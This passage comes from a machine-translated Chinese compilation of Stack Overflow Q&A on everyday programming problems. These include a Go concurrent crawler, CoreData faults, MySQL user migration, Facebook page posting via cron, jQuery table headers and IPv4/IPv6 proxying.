func Crawl(url string, depth int, fetcher Fetcher, ch chan bool) {
    // TODO: Fetch URLs in parallel.
    // TODO: Don't fetch the same URL twice.
    // This implementation doesn't do either:
    if depth <= 0 || s.getVal(url) {
        ch <- false
        return
    }
    body, urls, err := fetcher.Fetch(url)

    s.setVal(url)

    if err != nil {
        fmt.Println(err)
        ch <- false
        return
    }
    fmt.Printf("found: %s %q\n", url, body)
    chs := make(map[string]chan bool, len(urls))
    for _, u := range urls {
        chs[u] = make(chan bool)
        go Crawl(u, depth-1, fetcher, chs[u])
    }
    for _,v := range urls {
        <-chs[v]
    }
    ch <- true
    return
}

func main() {
    ch := make(chan bool)
    go Crawl("https://golang.org/", 4, fetcher, ch)
    <-ch
}

// fakeFetcher is Fetcher that returns canned results.
type fakeFetcher map[string]*fakeResult

type fakeResult struct {
    body string
    urls []string
}

func (f fakeFetcher) Fetch(url string) (string, []string, error) {
    if res, ok := f[url]; ok {
        return res.body, res.urls, nil
    }
    return "", nil, fmt.Errorf("not found: %s", url)
}

// fetcher is a populated fakeFetcher.
var fetcher = fakeFetcher{
    "https://golang.org/": &fakeResult{
        "The Go Programming Language",
        []string{
            "https://golang.org/pkg/",
            "https://golang.org/cmd/",
        },
    },
    "https://golang.org/pkg/": &fakeResult{
        "Packages",
        []string{
            "https://golang.org/",
            "https://golang.org/cmd/",
            "https://golang.org/pkg/fmt/",
            "https://golang.org/pkg/os/",
        },
    },
    "https://golang.org/pkg/fmt/": &fakeResult{
        "Package fmt",
        []string{
            "https://golang.org/",
            "https://golang.org/pkg/",
        },
    },
    "https://golang.org/pkg/os/": &fakeResult{
        "Package os",
        []string{
            "https://golang.org/",
            "https://golang.org/pkg/",
        },
    },
} 
```

* * *

## 回答 #21

> 赞同：-1
> 
> 时间：2020-08-27T07:29:02.200

我是新来的，所以一粒盐，但在我看来，这个解决方案似乎更惯用。它对所有结果使用单个通道，对所有抓取请求（尝试抓取特定 url）使用单个通道，以及用于跟踪完成的等待组。主 Crawl 调用充当对工作进程的抓取请求的分发者（同时处理重复数据删除），并充当有多少抓取请求待处理的跟踪器。

```
package main

import (
    "fmt"
    "sync"
)

type Fetcher interface {
    // Fetch returns the body of URL and
    // a slice of URLs found on that page.
    Fetch(url string) (body string, urls []string, err error)
}

type FetchResult struct {
    url  string
    body string
    err  error
}

type CrawlRequest struct {
    url   string
    depth int
}

type Crawler struct {
    depth           int
    fetcher         Fetcher
    results         chan FetchResult
    crawlRequests   chan CrawlRequest
    urlReservations map[string]bool
    waitGroup       *sync.WaitGroup
}

func (crawler Crawler) Crawl(url string, depth int) {
    defer crawler.waitGroup.Done()

    if depth <= 0 {
        return
    }

    body, urls, err := crawler.fetcher.Fetch(url)
    crawler.results <- FetchResult{url, body, err}

    if len(urls) == 0 {
        return
    }

    crawler.waitGroup.Add(len(urls))
    for _, url := range urls {
        crawler.crawlRequests <- CrawlRequest{url, depth - 1}
    }
}

// Crawl uses fetcher to recursively crawl
// pages starting with url, to a maximum of depth.
func Crawl(url string, depth int, fetcher Fetcher) (results chan FetchResult) {
    results = make(chan FetchResult)
    urlReservations := make(map[string]bool)
    crawler := Crawler{
        crawlRequests: make(chan CrawlRequest),
        depth:         depth,
        fetcher:       fetcher,
        results:       results,
        waitGroup:     &sync.WaitGroup{},
    }

    crawler.waitGroup.Add(1)

    // Listen for crawlRequests, pass them through to the caller if they aren't duplicates.
    go func() {
        for crawlRequest := range crawler.crawlRequests {
            if _, isReserved := urlReservations[crawlRequest.url]; isReserved {
                crawler.waitGroup.Done()
                continue
            }
            urlReservations[crawlRequest.url] = true
            go crawler.Crawl(crawlRequest.url, crawlRequest.depth)
        }
    }()

    // Wait for the wait group to finish, and then close the channel
    go func() {
        crawler.waitGroup.Wait()
        close(results)
    }()

    // Send the first crawl request to the channel
    crawler.crawlRequests <- CrawlRequest{url, depth}

    return
}

func main() {
    results := Crawl("https://golang.org/", 4, fetcher)
    for result := range results {
        if result.err != nil {
            fmt.Println(result.err)
            continue
        }
        fmt.Printf("found: %s %q\n", result.url, result.body)
    }

    fmt.Printf("done!")
}

// fakeFetcher is Fetcher that returns canned results.
type fakeFetcher map[string]*fakeResult

type fakeResult struct {
    body string
    urls []string
}

func (f fakeFetcher) Fetch(url string) (string, []string, error) {
    if res, ok := f[url]; ok {
        return res.body, res.urls, nil
    }
    return "", nil, fmt.Errorf("not found: %s", url)
}

// fetcher is a populated fakeFetcher.
var fetcher = fakeFetcher{
    "https://golang.org/": &fakeResult{
        "The Go Programming Language",
        []string{
            "https://golang.org/pkg/",
            "https://golang.org/cmd/",
        },
    },
    "https://golang.org/pkg/": &fakeResult{
        "Packages",
        []string{
            "https://golang.org/",
            "https://golang.org/cmd/",
            "https://golang.org/pkg/fmt/",
            "https://golang.org/pkg/os/",
        },
    },
    "https://golang.org/pkg/fmt/": &fakeResult{
        "Package fmt",
        []string{
            "https://golang.org/",
            "https://golang.org/pkg/",
        },
    },
    "https://golang.org/pkg/os/": &fakeResult{
        "Package os",
        []string{
            "https://golang.org/",
            "https://golang.org/pkg/",
        },
    },
} 
```

# ios - Coredata - “NSObjectInaccessibleException - CoreData 无法完成故障”

> ID：13217548
> 
> 赞同：3
> 
> 时间：2012-11-04T09:49:45.830
> 
> 标签：ios, core-data

我的 iOS 应用程序出现问题，我收到此错误：

```
“NSObjectInaccessibleException - CoreData could not fulfill a fault” 
```

当我更新数据库时，我从另一个线程执行此操作，并且在该线程中有此方法：

```
@interface UpdateDatabase : NSOperation

@property (nonatomic,copy) NSString *name;

@end

@implementation UpdateDatabase

- (void)mergeChanges:(NSNotification *)notification
{
    AppDelegate *appController = (AppDelegate *)[[UIApplication sharedApplication] delegate];
    NSManagedObjectContext *mainContext = [appController managedObjectContext];

// Merge changes into the main context on the main thread
[mainContext performSelectorOnMainThread:@selector(mergeChangesFromContextDidSaveNotification:) 
                              withObject:notification
                           waitUntilDone:YES];  
}

- (void)main {

    AppDelegate *appController = (AppDelegate *)[[UIApplication sharedApplication] delegate];

    self.managedObjectContext = [[NSManagedObjectContext alloc] init];
    [self.managedObjectContext setUndoManager:nil];
    [self.managedObjectContext setPersistentStoreCoordinator: [appController persistentStoreCoordinator]];

    // Register context with the notification center
    NSNotificationCenter *nc = [NSNotificationCenter defaultCenter]; 
    [nc addObserver:self
           selector:@selector(mergeChanges:) 
               name:NSManagedObjectContextDidSaveNotification
             object:self.managedObjectContext];

    [self checkForUpdate:self.name];

}

- (NSFetchedResultsController *)fetchedResultsController
{
    if (__fetchedResultsController != nil) {
        return __fetchedResultsController;
    }

    // Set up the fetched results controller.
    // Create the fetch request for the entity.
    NSFetchRequest *fetchRequest = [[NSFetchRequest alloc] init];
    // Edit the entity name as appropriate.
    NSEntityDescription *entity = [NSEntityDescription entityForName:@"Serial" inManagedObjectContext:self.managedObjectContext];
    [fetchRequest setEntity:entity];

    // Set the batch size to a suitable number.
    [fetchRequest setFetchBatchSize:20];

    // Edit the sort key as appropriate.
    NSSortDescriptor *sortDescriptor = [[NSSortDescriptor alloc] initWithKey:@"sectionNumber" ascending:NO];
    NSArray *sortDescriptors = [NSArray arrayWithObjects:sortDescriptor, nil];

    [fetchRequest setSortDescriptors:sortDescriptors];

    // Edit the section name key path and cache name if appropriate.
    // nil for section name key path means "no sections".
    NSFetchedResultsController *aFetchedResultsController = [[NSFetchedResultsController alloc] initWithFetchRequest:fetchRequest managedObjectContext:self.managedObjectContext sectionNameKeyPath:@"sectionNumber" cacheName:nil];
    aFetchedResultsController.delegate = self;
    self.fetchedResultsController = aFetchedResultsController;

    NSError *error = nil;
    if (![self.fetchedResultsController performFetch:&error]) {
        /*
        Replace this implementation with code to handle the error appropriately.

        abort() causes the application to generate a crash log and terminate. You should not use this function in a shipping application, although it may be useful during development. 
        */
        NSLog(@"Unresolved error %@, %@", error, [error userInfo]);
        abort();
    }

    return __fetchedResultsController;
} 

- (void)checkForUpdate:(NSString *)name 
{
    NSFetchRequest *fetchRequest = [[NSFetchRequest alloc] init];

    NSEntityDescription *entity = [NSEntityDescription entityForName:@"Serial" inManagedObjectContext:self.managedObjectContext];

    [fetchRequest setEntity:entity];
    //Controllo prima che la serie di cui voglio fare l'aggiornamento non sia in download, e non stia facendo già un aggiornamneto (caso mai per qualche strana ragione non ne siano partiti 2), prendo solo le altre.
    [fetchRequest setPredicate:[NSPredicate predicateWithFormat:@"%K == %@", @"serialName",self.name]];
    NSError *error;

    NSArray *fetchedObjects = [self.managedObjectContext executeFetchRequest:fetchRequest error:&error];

    for (NSManagedObject *info in fetchedObjects) {
        //i update the object
    }

    if (![self.managedObjectContext save:&error]) {
        // Replace this implementation with code to handle the error appropriately.
        // abort() causes the application to generate a crash log and terminate.
        // You should not use this function in a shipping application, although it may be useful
        // during development. If it is not possible to recover from the error, display an alert
        // panel that instructs the user to quit the application by pressing the Home button.
        //
        NSLog(@"Unresolved error %@, %@", error, [error userInfo]);
        abort();
    }
}
@end 
```

我为核心数据数据库中的每个元素启动一个新的 nsoperation，然后在我有 UITableView 的视图中，我有这个：

```
 - (NSFetchedResultsController *)fetchedResultsController
{
    if (__fetchedResultsController != nil) {
        return __fetchedResultsController;
    }

    // Set up the fetched results controller.
    // Create the fetch request for the entity.
    NSFetchRequest *fetchRequest = [[NSFetchRequest alloc] init];
    // Edit the entity name as appropriate.
    NSEntityDescription *entity = [NSEntityDescription entityForName:@"Serial" inManagedObjectContext:self.managedObjectContext];
    [fetchRequest setEntity:entity];

    // Set the batch size to a suitable number.
    [fetchRequest setFetchBatchSize:20];

    // Edit the sort key as appropriate.
    NSSortDescriptor *sortDescriptor = [[NSSortDescriptor alloc] initWithKey:@"sectionNumber" ascending:NO];

    NSSortDescriptor *numberDayDescriptor = [[NSSortDescriptor alloc] initWithKey:@"numberOfDays" ascending:YES];
    NSSortDescriptor *serialNameDescriptor = [[NSSortDescriptor alloc] initWithKey:@"serialName" ascending:YES];
    NSArray *sortDescriptors = [NSArray arrayWithObjects:sortDescriptor,numberDayDescriptor,serialNameDescriptor, nil];

    [fetchRequest setSortDescriptors:sortDescriptors];

    // Edit the section name key path and cache name if appropriate.
    // nil for section name key path means "no sections".
    NSFetchedResultsController *aFetchedResultsController = [[NSFetchedResultsController alloc] initWithFetchRequest:fetchRequest managedObjectContext:self.managedObjectContext sectionNameKeyPath:@"sectionNumber" cacheName:@"Master"];
    aFetchedResultsController.delegate = self;
    self.fetchedResultsController = aFetchedResultsController;

    NSError *error = nil;
    if (![self.fetchedResultsController performFetch:&error]) {
        /*
        Replace this implementation with code to handle the error appropriately.

        abort() causes the application to generate a crash log and terminate. You should not use this function in a shipping application, although it may be useful during development. 
        */
        NSLog(@"Unresolved error %@, %@", error, [error userInfo]);
        abort();
    }

    return __fetchedResultsController;
}    

- (void)controllerWillChangeContent:(NSFetchedResultsController *)controller
{
    [self.tableView beginUpdates];
}

- (void)controller:(NSFetchedResultsController *)controller didChangeSection:(id <NSFetchedResultsSectionInfo>)sectionInfo
       atIndex:(NSUInteger)sectionIndex forChangeType:(NSFetchedResultsChangeType)type
{
    switch(type) {
        case NSFetchedResultsChangeInsert:
            [self.tableView insertSections:[NSIndexSet indexSetWithIndex:sectionIndex] withRowAnimation:UITableViewRowAnimationFade];
            break;

        case NSFetchedResultsChangeDelete:
            [self.tableView deleteSections:[NSIndexSet indexSetWithIndex:sectionIndex] withRowAnimation:UITableViewRowAnimationFade];
            break;
    }
}

- (void)controller:(NSFetchedResultsController *)controller didChangeObject:(id)anObject
   atIndexPath:(NSIndexPath *)indexPath forChangeType:(NSFetchedResultsChangeType)type
  newIndexPath:(NSIndexPath *)newIndexPath
{
    UITableView *tableView = self.tableView;

    switch(type) {
        case NSFetchedResultsChangeInsert:
            [tableView insertRowsAtIndexPaths:[NSArray arrayWithObject:newIndexPath] withRowAnimation:UITableViewRowAnimationFade];
            break;

        case NSFetchedResultsChangeDelete:
            [tableView deleteRowsAtIndexPaths:[NSArray arrayWithObject:indexPath] withRowAnimation:UITableViewRowAnimationFade];
            break;

        case NSFetchedResultsChangeUpdate:
            [self configureCell:[tableView cellForRowAtIndexPath:indexPath] atIndexPath:indexPath];
            break;

        case NSFetchedResultsChangeMove:
            [tableView deleteRowsAtIndexPaths:[NSArray arrayWithObject:indexPath] withRowAnimation:UITableViewRowAnimationFade];
            [tableView insertRowsAtIndexPaths:[NSArray arrayWithObject:newIndexPath]withRowAnimation:UITableViewRowAnimationFade];
            break;
    }
}

- (void)controllerDidChangeContent:(NSFetchedResultsController *)controller
{
    [self.tableView endUpdates];
} 
```

有时应用程序崩溃，有时不崩溃，我该如何处理这个错误？我在 SO 上阅读了一些关于这个问题的问题，有人谈论删除 fetchbatchsize 和缓存，你怎么看？我哪里错了？

**编辑：**

我已经编辑了代码。

# mysql - 将mysql用户迁移到另一台服务器

> ID：13217563
> 
> 赞同：9
> 
> 时间：2012-11-04T09:53:49.060
> 
> 标签：mysql, permissions, migration, debian, mysqldump

我创建了一个`mysqldump --all-databases` 并将所有数据库转移到新服务器。它不起作用，因为`debian-sys-maint`用户密码不匹配。所以我更改了这个用户的密码。之后，我重新启动服务器并收到此错误。

> 第 1 行的错误 1577 (HY000)：无法继续，因为发现事件调度程序使用的系统表在服务器启动时损坏 第 1 行的错误 1547 (HY000)：mysql.proc 的列数错误。预期 20，发现 16。表可能已损坏

我不知道这之后还会出现多少错误。所以我认为只使用与我的应用程序关联的数据库创建转储（`mysqldump --databases`）。

现在如何**迁移用户**？有什么标准方法吗？

### 更多信息：

```
New Server version: 5.1.63-0+squeeze1 (Debian)
Old Server version: 5.0.51a-24+lenny5 (Debian) 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-04T11:35:06.230

您可能需要运行[mysql_upgrade](http://dev.mysql.com/doc/refman/5.1/en/mysql-upgrade.html)，因为您的 MySql 版本不同。

但是，作为一般规则，不要将`mysql`系统模式从一台服务器复制到另一台服务器。因此，据我所知，没有将用户和用户权限从一台服务器复制到另一台服务器的“标准”方式。

如果您真的想要/需要这样做，请尝试以下操作：

```
$> mysql --silent --skip-column-names -e"show grants for user@host" 
```

上面的输出[`GRANT`](http://dev.mysql.com/doc/refman/5.5/en/show-grants.html)语句可以直接输入目标服务器以创建用户并给予相同的授权。

但是，如果您的目标服务器是空的，您可以将整个数据文件夹从旧服务器移动到新服务器，然后在新服务器上运行[从 5.0 到 5.1 的标准升级过程](http://dev.mysql.com/doc/refman/5.1/en/upgrading.html)。

# php - Facebook PHP 使用 cronjob 发布到粉丝页面？

> ID：13217564
> 
> 赞同：18
> 
> 时间：2012-11-04T09:53:53.703
> 
> 标签：php, facebook, cron

我正在使用以下代码发布到我的 facebook 粉丝页面，它工作正常。现在我想使用 cronjob 来发布到 Facebook。我知道我必须用作访问令牌，但我不知道如何设置它。我尝试使用`echo`我自己的访问令牌和页面的访问令牌并在 post api 中使用它，但这不起作用我收到此错误：

```
Uncaught OAuthException: An active access token must be used to query information about the current user. 
```

这是我尝试过的代码：

```
require_once('scripts/facebook.php');
    $config = array('appId' => 'xxx','secret' => 'xxx');

    $params = array('scope'=>'user_likes,publish_actions,email,offline_access,publish_stream,manage_pages');
    $facebook = new Facebook($config);
    $user = $facebook->getUser();
    if($facebook->getUser()) {
    try {

        $user_profile = $facebook->api('/me');
        $access_token = $facebook->getAccessToken();
        //echo "1\. ".$access_token;

      } catch(FacebookApiException $e) {
                        $login_url = $facebook->getLoginUrl($params);
                        error_log($e->getType());
                        error_log($e->getMessage());
      }   
    } else {
        $login_url = $facebook->getLoginUrl($params);

    }    

$page_id = "xxxxxxxxxxxxx";
            $page_access_token = "";
            $result = $facebook->api("/me/accounts");
            foreach($result["data"] as $page) {
                if($page["id"] == $page_id) {
                $page_access_token = $page["access_token"];
                //echo '<br>';
                //echo "2\. ".$page_access_token;
                break;
                    }
                }

        $args = array(
            'access_token'  => 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx',
            'message'       => stripslashes($image_caption).$animaged_gif,
            'name' => stripslashes($image_caption).$animaged_gif,
            'link' => "http://www.example.com/images.php?i=".$image_name,
            'picture' => "http://www.example.com/thumbnails/".$image_name.".png",
            'actions' => array(
            'name' => 'See Pic',
            'link' => "http://www.example.com/images.php?i=".$image_name
            )

        );
       $post = $facebook->api("/$page_id/feed","post",$args); 
```

如您所见，我尝试使用在回显自己的访问令牌时获得的实际访问令牌。但这没有用。我还使用了页面的访问令牌，但这也没有用。你能告诉我这里缺少什么或正确的方法是什么吗？经过进一步的搜索，我发现了`setAccessToken`，`$page_info = $fb->api("/".$sInfo['pageId']."?fields=access_token");`但是关于如何使用它们的资源非常有限。我什至不确定这些是否适合这个问题。我只需要知道我需要使用哪个访问令牌以及设置它的适当代码是什么？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-08T07:52:11.103

这是你可以做到的：

1.  获得一个短暂的访问令牌。
2.  扩展它。
3.  获取一个长期存在的页面访问令牌。（没关系，这里我们将每次都获取新的访问令牌。不太复杂，可靠。）

以为我会使用算法，而是添加所有可能的代码和文档，因为这也可能对其他人有所帮助。

获取短期访问令牌并扩展它：

**获取令牌.php**

```
<?php

//read more : https://developers.facebook.com/docs/howtos/login/server-side-login/
session_start();
$app_id = "xxxxxxxxxxxxxx";
$app_secret = "xxxxxxxxxxxxxxxx";
$my_url = "www.stackoverflow.com/";  // redirect url

$code = $_REQUEST["code"];

if(empty($code)) {
    // Redirect to Login Dialog
    $_SESSION['state'] = md5(uniqid(rand(), TRUE)); // CSRF protection
    $dialog_url = "https://www.facebook.com/dialog/oauth?client_id=" 
       . $app_id . "&redirect_uri=" . urlencode($my_url) . "&state="
       . $_SESSION['state'] . "&scope=publish_stream,read_friendlists,email";

    echo("<script> top.location.href='" . $dialog_url . "'</script>");
}
if($_SESSION['state'] && ($_SESSION['state'] === $_REQUEST['state'])) {
    $token_url = "https://graph.facebook.com/oauth/access_token?"
       . "client_id=" . $app_id . "&redirect_uri=" . urlencode($my_url)
       . "&client_secret=" . $app_secret . "&code=" . $code;

     $response = file_get_contents($token_url);
     $params = null;
     parse_str($response, $params);
     $longtoken=$params['access_token'];

//save it to database   
} 
?> 
```

因此，您现在可以在数据库、文本文件或其他任何内容中准备好长期存在的访问令牌。

**cronjob.php**

```
<?
require_once('scripts/facebook.php');
// Pull access token from the file/db
$access_token = "access token from file or db";
$facebook->setAccessToken($access_token); // sets our access token as the access token when we call something using the SDK, which we are going to do now.

$config = array('appId' => 'xxx','secret' => 'xxx');

$params = array('scope'=>'user_likes,publish_actions,email,publish_stream,manage_pages');
$facebook = new Facebook($config);
$user = $facebook->getUser();
if($facebook->getUser()) {
    try {

        $user_profile = $facebook->api('/me');
    } catch(FacebookApiException $e) {
        $login_url = $facebook->getLoginUrl($params);
        error_log($e->getType());
        error_log($e->getMessage());
    }   
}
else {
    $login_url = $facebook->getLoginUrl($params);
}    

$page_id = "xxxxxxxxxxxxx";
$page_access_token = "";
$result = $facebook->api("/me/accounts");
foreach($result["data"] as $page) {
    if($page["id"] == $page_id) {
        $page_access_token = $page["access_token"];
        //echo '<br>';
        //echo "2\. ".$page_access_token;
        break;
    }
}

$args = array(
    'access_token'  => $page_access_token,
    'message'       => stripslashes($image_caption).$animaged_gif,
    'name' => stripslashes($image_caption).$animaged_gif,
    'link' => "http://www.example.com/images.php?i=".$image_name,
    'picture' => "http://www.example.com/thumbnails/".$image_name.".png",
    'actions' => array(
            'name' => 'See Pic',
             'link' => "http://www.example.com/images.php?i=".$image_name
    )
);
$post = $facebook->api("/$page_id/feed","post",$args);
?> 
```

**确保不要在脚本中再次获取 access_token(user access token / $access_token)。**

此外，`access_token`页面`$args`访问令牌应该由 $page_access_token 变量插入，而不是手动插入。

在`offline_access`范围内除了在权限对话框中显示他们可以随时访问他们的数据之外没有任何作用，无论如何都可以在没有通知的情况下完成。

只要您在开始时访问 fetch.php 一次，并且每 60 天**手动**访问一次，这应该可以工作。

让我知道。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-11-06T00:52:53.237

这应该可以解决它。

**offline_access**已弃用。它现在被一个系统所取代，您可以在其中获得延长的到期 access_token。

当您手动运行它时，您会生成一个实时访问令牌，该令牌在您实际运行后 1-2 小时后失效。而且您无法使用 cron 生成另一个 access_token。应手动生成访问令牌。

所以要修复它，请阅读：[https ://developers.facebook.com/roadmap/offline-access-removal/](https://developers.facebook.com/roadmap/offline-access-removal/)

并实现：[https ://developers.facebook.com/docs/howtos/login/server-side-login/](https://developers.facebook.com/docs/howtos/login/server-side-login/)

并将访问令牌保存到您的数据库中。运行 cron 时，从数据库中获取令牌。

**PS：access_token有效期为60天，需要再次延期，用户手动登录即可。access_token 通常“可能”不会改变，只会延长到期时间。**

**添加 ：**

**安排帖子：** 您也可以将帖子安排长达 6 个月。只是阅读它，并认为我会指出。

阅读：[https](https://developers.facebook.com/docs/reference/api/page/) ://developers.facebook.com/docs/reference/api/page/向下滚动到帖子创建部分

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-06-09T20:33:25.120

您可以放弃 Facebook API 的全部开销并遵循这种极其简单的方法。

检查页面设置的“移动”部分中的页面特定电子邮件地址（[https://www.facebook.com/pages/edit/?id=INSERT_YOUR_PAGE_ID_HERE&sk=mobile](https://www.facebook.com/pages/edit/?id=INSERT_YOUR_PAGE_ID_HERE&sk=mobile)），然后在此处使用它：

```
<?php
    mail("thatEmailAddress@facebook.com", "New Status Update!", "");
?> 
```

正文是空的，因为 Facebook 说“要更新您的状态，请在电子邮件主题行中写入并将电子邮件正文留空。”

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-09-07T12:44:51.570

您可以在这里查看[https://github.com/newbacknew/owloo.com](https://github.com/newbacknew/owloo.com)。这是来自 owloo.com 的脚本库，用于通过“ADS”仪表板从 Facebook 获取数据，还必须从 Twitter 和 Instagram 检索分析数据。

使用基本脚本，您可以从 Facebook 获取每个国家、城市、舞台、粉丝专页的趋势、兴趣、行为、人口统计、年龄、性别数量

所有脚本的基础都在备份文件夹的 WSERVICE 文件夹中。

# design-patterns - 控制容器倒置和依赖注入模式的区别

> ID：13217569
> 
> 赞同：0
> 
> 时间：2012-11-04T09:54:15.237
> 
> 标签：design-patterns

控制容器反转和依赖注入模式有什么区别？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T18:28:11.010

没有区别'。控制反转容器可用于创建类的实例，通过构造函数、属性或方法注入注入所需的任何依赖项。

最终，IoC 容器是“执行者”，而注入是“完成”的事情。

阅读 Mark Seemann 的作品以获得完整而清晰的画面。

# php - php 时间 2 小时只对 50% 的用户错误

> ID：13217571
> 
> 赞同：3
> 
> 时间：2012-11-04T09:54:19.730
> 
> 标签：php

我对 php 时间有很大的问题。

出于某种原因，它向某些用户显示不同的时间（2 小时），而向其他用户显示正确的时间。

代码是 H:i:s dMy T，当我从 PC 上的浏览​​器中查看页面时，它告诉我上午 11 点，实际上是上午 9 点，当我使用我的 RDP 通过浏览器检查时，我得到了正确的时间。

两台电脑都在国家（英国），两台电脑都具有相同的系统时间等。

尝试设置时区默认值，但无论我做什么，服务器仍然显示一些用户正确的时间，而其他用户的时间提前 2 小时，有什么想法吗？

代码是`echo gmdate("H:i:s d-M-y T");`

```
<?php echo gmdate("H:i:s d-M-y T"); ?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T10:58:15.350

作为一种解决方法，让我解释一下：有些用户得到正确的时间，其他用户得到-2h。如果我们在文件中记录最后一次，并且下次用户打开页面时，我们检查 $now 是否小于 $last_time，如果是，我们添加 2 小时！让我用数字解释一下，User1 访问了该页面，它返回了正确的时间，比如说上午 11 点。用户2打开页面，返回上午9点，显然我们不能及时返回，所以我们增加了2个小时！

这里的代码：

```
<?php
$last_time = file_get_contents("file.txt"); // a file where the last time has been saved
$now = strtotime(gmdate("H:i:s d-M-y T")); // Now !
if($now < $last_time){
    $now += 7200; // add 2 hours !
}
file_put_contents("file.txt", $now);
echo gmdate("H:i:s d-M-y T", $now);
?> 
```

希望这有帮助！

# jquery - 如何使用jQuery动态计算位置并将标题放置到一组html表格列中

> ID：13217575
> 
> 赞同：0
> 
> 时间：2012-11-04T09:54:58.483
> 
> 标签：jquery, html

我需要放置一个标签，该标签将作为表中一组列的标题，标签应从第 7 列开始到第 12 列结束，涵盖 7-12 的列。谁能告诉我如何我可以用 jQuery 做到这一点吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T10:38:03.780

如评论所述，您根本不需要使用 javascript：

```
<table>
  <tr>
    <th colspan=6 style="visibility:hidden"> </th> <!-- 1..6 -->
    <th colspan=6> header for 7-12 </th> <!-- 7..12 -->
  </tr>
  ...
</table> 
```

* * *

如果需要，您也可以动态附加相同的结构；这是一种方法：

```
$("#my-table").prepend(
  $("<tr>").append(
    $("<td>",{colspan:6})
      .css({visibility:"hidden"})
  ).append(
    $("<td>",{colspan:6})
      .text("header for 7-12")
  )
) 
```

* * *

如果您不想使用 colspan，则必须手动定位标题；这是一个草图（未经测试）：

```
var header = $("<div>")
  .css({position:"relative", top:0})
    //note the use of 'relative' to allocate space
  .text("header for 7-12");
var table = $("#my-table");
table.prepend(header.wrap("<tr><td/></tr>"));

(function recalculate(){
   header.css({
     left:$("td:nth-child(6)",table).offset().left - table.offset().left,
     width: table.width() - $("td:nth-child(6)",table).offset().left
       //assuming there's no 13th column
   })
})(); //invoke now

$(window).on("resize", recalculate);
table.on("my-data-change", recalculate);
  //when you change the table, do $("#my-table").trigger("my-data-change") 
```

# ruby-on-rails - rspec - 存根包含的方法

> ID：13217576
> 
> 赞同：2
> 
> 时间：2012-11-04T09:55:04.597
> 
> 标签：ruby-on-rails, rspec, include

我需要存根包含在控制器中的辅助方法。是的，这是不好的做法，但现在这就是我必须忍受的。

```
class ApplicationController < ActionController::Base
  include ApplicationHelper 
```

假设 application_helper 有一个`:foo`包含在控制器中的方法。我尝试过像这样的存根：

1.  `controller.stub(:foo)`
2.  `@helper = Object.new.extend ApplicationHelper; @helper.stub(:foo)`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T15:09:59.070

我以前在这方面取得了成功：

```
@controller.stub(:foo) 
```

注意. `@`_`controller`

# proxy - 如何使用 ipv6 请求连接到 ipv4 主机？

> ID：13217577
> 
> 赞同：5
> 
> 时间：2012-11-04T09:55:14.270
> 
> 标签：proxy, ipv6, ipv4

虽然现在大多数主机都有 ipv6 地址，但仍有一些主机只有 ipv4。在我的局域网中，使用 ipv4 的连接需要花钱，而使用 ipv6 的连接是免费的。我想实现一个代理来转换 ipv4 和 ipv6 请求，这样我就可以免费连接到 ipv4 主机。有可能实现吗？有没有可用的软件？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T11:00:50.427

这在很大程度上取决于您想要连接的设备、服务/协议和方向。

**NAT64/DNS64**

使用 NAT64/DNS64，您可以让仅 IPv6 的客户端连接到仅 IPv4 的服务器。系统使用 DNS64 服务器查找要连接的服务器的名称。如果 DNS64 服务器发现只有一个 IPv4 地址可用，它会将服务器的 IPv4 地址替换为一个特殊的 IPv6 地址，在该地址中它已经对原始 IPv4 地址进行了编码。当纯 IPv6 系统连接到该 IPv6 地址时，NAT64 路由器知道其意图是连接到 IPv6 地址中编码的 IPv4 地址，并且它将建立到该 IPv4 地址的 NAT 会话。NAT64 框需要同时具有 IPv4 和 IPv6 地址才能执行此操作。

**HTTP 代理**

如果您只想支持 HTTP 和类似协议，那么您可以使用 HTTP 代理服务器。它需要同时具有 IPv4 和 IPv6 地址，并且您的应用程序/设备需要支持使用代理服务器。它适用于纯 IPv4 客户端和纯 IPv6 服务器，反之亦然。

**袜子5**

SOCKS5 代理服务器的使用方式与 HTTP 代理服务器的使用方式相同，但协议种类更广泛。不过，您的客户需要支持它。

**其他**

在 IPv4 和 IPv6 之间还有其他更多特定于应用程序的代理方式。上面提到的几个只是为了让你了解常见的。

# code-generation - 在 xtext 中生成静态对象

> ID：13217580
> 
> 赞同：0
> 
> 时间：2012-11-04T09:56:17.343
> 
> 标签：code-generation, xtext, xtend

继续生成字段的示例，例如：

```
def handle (EClass c) {
  val attr = EcoreFactory::eINSTANCE.createEAttribute
  attr.name = "test"
  attr.EType = EcorePackage::eINSTANCE.EString
  c.EStructuralFeatures += attr
} 
```

我可以将其生成为静态字段吗？怎么做？

提前致谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-18T14:37:53.310

Ecore 与 Java 的对象模型不同，不幸的是，EAttributes 不能像 Java 中的字段那样是静态的。

# email - Magento：我无法翻译 [sales_email_order_items]

> ID：13217586
> 
> 赞同：1
> 
> 时间：2012-11-04T09:58:13.093
> 
> 标签：email, magento, translate

我的问题：

在 magento admin 中，我制作了自己的电子邮件模板（order_new.html、order_new_guest.html）并翻译它们。一切正常，当我买东西时，我收到一封翻译的电子邮件，但我无法翻译 sales_email_order_items 块/'Subtotal（Excl.Tax）'、'Subtotal（Incl.Tax）'等中的数据名称/ -其他所有内容都在块中翻译！

Mage_Sales.csv、Mage_Weee.csv、Mage_Tax.csv 存在于 locale/[country_language] 目录下，并已翻译

有谁知道这些词是从哪里来的？

谢谢各位的解答

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T19:10:23.967

检查模板/电子邮件/订单/* 中的模板查看使用的助手名称以找出应该更改哪些 csv 文件

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T20:07:27.770

需要编辑的文件是：

```
\app\design\frontend\base\default\template\email\order\items\order\default.phtml 
```

属性标签输出周围缺少翻译包装器。更改第 35 行：

```
<dt><strong><em><?php echo $option['label']; ?></em></strong></dt> 
```

至：

```
